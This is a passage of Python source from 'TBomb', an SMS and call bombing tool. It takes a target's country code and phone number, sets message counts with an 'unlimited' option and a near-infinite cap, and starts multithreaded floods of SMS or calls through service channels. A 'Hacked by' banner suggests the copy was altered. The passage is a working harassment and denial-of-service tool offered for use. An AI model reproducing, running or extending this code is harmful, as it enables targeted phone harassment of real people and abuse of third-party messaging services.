 md1=s1[s1.find(':')+1:]
 if os.path.exists(f1):
  md2=hashlib.md5(open(f1,'rb').read()).hexdigest()
 else:
  md2='speedx'
  '''
 if md1!=md2:
  print('\n\n\tThis Version Of TBomb Does Not Appears To Be The Latest Version...')
  print('\tPlease Update TBomb From Main Menu Or Reclone TBomb ')
  print('\tTo Update Type ./TBomb And Select Option 3 in Main Menu')
  print('\tGithub https://github.com/TheSpeedX/TBomb')
  print('\tMail ggspeedx29@gmail.com')
  input('Press Enter To Exit..')
  exit()
  '''
print('\n\tVerification Successfull !!!')
print('\n\n\t\t\tStarting TBomb...\n\n')
res=urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/test/master/bomb.pro")
txt=res.read().decode(res.headers.get_content_charset())
try:
 noti=urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/test/master/bomb.not").read().decode('utf-8')
 noti=noti.upper().strip()
 if len(noti)>10:
  print('\n\n\tNOTIFICATION: '+noti+'\n\n')
except:
 pass
while True:
 pn=""
 cc=input("\tEnter Your Country Code (Without +) : ")
 if '+' in cc:
  tc=list(cc)
  tc.remove('+')
  cc=''.join(tc)
  cc=cc.strip()
 pn=input("\tEnter Target Number: +"+cc+" ")
 pn=remsp(pn)
 if len(cc)>=4 or len(cc)<1:
  print('\n\nInvalid Country Code..\n\t\tCountry Codes Are Generally 1-3 digits...\n')
  continue
 if len(pn)<=6:
  print('\n\nInvalid Phone Number..\n')
  continue
 for cch in str(cc+pn):
  if not cch.isdigit():
   print('\n\nPhone Number Must Consist Of Numbers Only\n')
   continue
 break
if not txt.find(pn)==-1:
 print('\n\n\tSorry This Number is Fully Protected...')
 banner()
 exit()
type=0
try:
 if os.path.isfile('call.xxx'):
  type=1
 elif os.path.isfile('protect.xxx'):
  type=2
except:
 type=0
if type==2:
 protect(cc,pn)
 exit()
prt=checkprotect(cc,pn)
if prt:
 print('\n\tSorry This Number is in Protection List For 24 hours')
 print('Try Bombing This Number After 24 Hours')
 input('\t\tPress Enter To Exit...')
 banner()
 exit()
else:
 print('\n\tNumber Not Protected...')
if type==1:
 nm=int(input("Enter Number of Calls To Send(Maximum 15): "))
 if nm>15:
  print("\t\tYou Have Entered "+str(nm)+".\n\tNormalizing Value To 15")
  nm=15
 dl=float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
elif type==0:
 if cc=="91":
  nm=int(input("Enter Number of Messages To Send(0 For Unlimited): "))
 else:
  nm=int(input("Enter Number of Messages To Send: "))
 dl=float(input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))
maxlim=0
if cc=="91":
 maxlim=100000000000000000000000
else:
 maxlim=100000000000000000000000
if nm>maxlim:
 print('\n\n\tSorry Due To Misuse Of This Script We Only Provide '+str(maxlim)+' SMS At Once...\n\n')
 print('Number Of SMS Has been Set To '+str(maxlim))
 nm=maxlim
if not cc.strip().lower()=="91":
 if type==1:
  print('\t\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')
  print()
  input('Press Enter To Exit....')
  print('\n\n')
  banner()
  exit()
 cnt=0
 if pn.strip()=='' or dl<=0 or cc.strip()=='' or cc.find('+')!=-1:
  print('\n\n\tSeems Like You Have Given Wrong Inputs...')
  input('\n\t\tPress Enter To Exit...')
  banner()
  exit()
 ch=[0,26,27,31,32,33]
 if cc=="27":
  ch.append(28)
 elif cc=="234":
  ch.append(29)
  ch.append(30)
 elif cc=="92":
  ch.append(22)
  ch.append(23)
 logit(cc+pn,type)
 start(pn,nm,dl,ch,str(cc))
 exit()
ch1=[0,26,27,31,32,33]
ch2=[0,26,27,31,32,33]
cbomb=False
if pn.strip()=='' or dl<=0 or nm<0:
 print('\n\n\tSeems Like You Have Given Wrong Inputs...')
 input('\n\t\tPress Enter To Exit...')
 banner()
 exit()
if type==1:
 print("NOTE: Call Bomb Might Not Work on DND Activated Numbers...\n")
 print("\n\tPlease Don't Overload Call Bomb So That Is Would Work For Longer Period Of Time...")
 cbomb=True
if cbomb:
 chl=[100,101,102,103,104,105,106]
 #logit(cc+pn,type)
 start(pn,nm,dl,chl,str(cc))
 exit()
if nm==0:
 nt=int(input("\tNumber Of Threads(10 to 20) : "))
 if nt<=0 or nt>=30:
  print('\tTBomb Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
 print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
 t=[None]*nt
 #logit(cc+pn,0)
 print("\n\n==================================================================")
 print("                Gearing Up Bomber, please wait !!               ")
 print("     Please keep your data connection active during bombing !!    ")
 print("==================================================================")
 print("             Target Number       : +",cc,pn)
 print("             Number of Threads   : ",nt)
 print("             Delay               : ",dl)
 print("             Hacked by https://vk.com/ld611")
 print("==================================================================")
 print("              Use this for fun, not for revenge !!                ")
 print("              This Bomber Was Created By SpeedX !!                ")
 print("==================================================================")
 input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
 os.system('rm *.xxx* > /dev/null 2>&1')
 print("\n\nStarting Bomb....")
 for i in range(nt):
  if i%3==0:
   t[i]=threading.Thread(target=infinite,args=(pn,dl,ch1,))
  else:
   t[i]=threading.Thread(target=infinite,args=(pn,dl,ch2,))
  t[i].daemon=True
  t[i].start()
 os.popen('touch count.xxx > /dev/null 2>&1')
 time.sleep(2)
 ci=0
 while True:
  ci+=1
  l=os.popen('wc -l count.xxx').read().split(' ')[0]
  print("	   Total Number of Requests Sent : ",l)
  if int(l)>maxlim:
   print('\n\n\tSorry Due To Misuse Of This Script We Only Provide '+str(maxlim)+' SMS At Once...\n\n')
   input('Press Enter To Exit...')
   os.system('rm *xxx* > /dev/null 2>&1')
   banner()
   exit()
  time.sleep(1)
  if ci%3==0:
   checkintercept()
else:
 for nmc in ch2:
  ch1.append(nmc)
  ch1.append(nmc)
  ch1.append(nmc)
 ch=ch1
 logit('91'+pn,type)
 start(pn,nm,dl,ch,'91')
 exit()
